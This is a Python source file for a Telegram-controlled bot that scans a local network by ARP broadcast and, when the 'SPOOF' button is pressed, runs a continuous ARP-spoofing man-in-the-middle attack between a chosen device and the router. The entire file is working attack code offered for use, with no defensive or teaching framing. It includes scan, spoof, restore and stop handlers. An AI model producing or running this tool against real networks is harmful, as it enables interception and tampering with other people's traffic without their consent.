import os
import threading
import time
import scapy.all as scapy
from scapy.all import ARP, Ether, srp
from scapy.layers.l2 import getmacbyip
from scapy.sendrecv import sendp
import telebot
from telebot import types
from dotenv import load_dotenv
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

load_dotenv()

router_ip = ''
router_mac = ''

attacco_attivo = threading.Event()

bot_key = os.getenv('BOT_KEY')
chat_id = os.getenv('CHAT_ID')

shortcut = {
# Add your frequently used IP ranges here for quick access.
    # Format: 'label': 'network_address/mask'
    #
    # Example:
    # 'home': 192.168.1.0/24

}

bot = telebot.TeleBot(bot_key)

def auth(message):
    return str(message.from_user.id) == chat_id

def scan(ip_range):
    logging.info(f'Starting scan {ip_range}')

    arp = ARP(pdst=ip_range)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether / arp
    devices = []
    result = srp(packet, timeout=2, verbose=False)[0]

    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

def spoof(ip_target, mac_target, spoof_ip):
    arp = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=spoof_ip)
    eth = Ether(dst=mac_target)
    packet = eth / arp
    sendp(packet, verbose=False, count=4)

def restore(ip_target, mac_target, spoof_ip, spoof_mac):
    packet = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(packet, verbose=False, count=4)

def x_scan(message):
    if not auth(message):
        return

    ip_range = message.text
    ip_range = shortcut.get(ip_range.lower(), ip_range)
    devices = scan(ip_range)

    if not devices:
        bot.send_message(message.chat.id, '❌ No Devices Found')
        return

    for d in devices:
        markup = types.InlineKeyboardMarkup()
        button = types.InlineKeyboardButton(text=f"SPOOF {d['ip']}", callback_data=f"spoof_{d['ip']}_{d['mac']}")
        markup.add(button)
        bot.send_message(message.chat.id, f"🚨 DEVICE DETECTED\n📍 IP: {d['ip']}\n🆔 MAC: {d['mac']}", reply_markup=markup)

@bot.message_handler(commands=['scan'])
def start_scan(message):
    if not auth(message):
        return
    msg = bot.send_message(message.chat.id, '🖋️ Enter Your IP Range')
    bot.register_next_step_handler(msg, x_scan)

def spoof_x(ip_target, mac_target):
    try:
        while attacco_attivo.is_set():
            spoof(ip_target, mac_target, router_ip)
            spoof(router_ip, router_mac, ip_target)
            time.sleep(3)
    except Exception as e:
        logging.error(e)
    finally:
        attacco_attivo.clear()
        restore(ip_target, mac_target, router_ip, router_mac)
        restore(router_ip, router_mac, ip_target, mac_target)

@bot.callback_query_handler(func=lambda call: call.data.startswith('spoof_'))
def start_spoof(call):
    if str(call.from_user.id) != chat_id:
        return
    global router_ip, router_mac

    data = call.data.split('_')
    ip_target = data[1]
    mac_target = data[2]

    try:
        router_ip = scapy.conf.route.route('0.0.0.0')[2]
        router_mac = getmacbyip(router_ip)
        if not router_mac:
            bot.send_message(call.message.chat.id, '❌ Unable To Find Router MAC')
            return
    except Exception as e:
        logging.error(e)
        return

    if attacco_attivo.is_set():
        bot.answer_callback_query(call.id, '⚠️ Attack Already Running')
        return

    attacco_attivo.set()
    thr = threading.Thread(target=spoof_x, args=(ip_target, mac_target), daemon=True)
    thr.start()
    bot.answer_callback_query(call.id, '✅ Attack Started')

@bot.message_handler(commands=['stop'])
def stop_spoof(message):
    if not auth(message):
        return
    attacco_attivo.clear()
    bot.send_message(message.chat.id, '🛑 Attack Stopped')

bot.infinity_polling()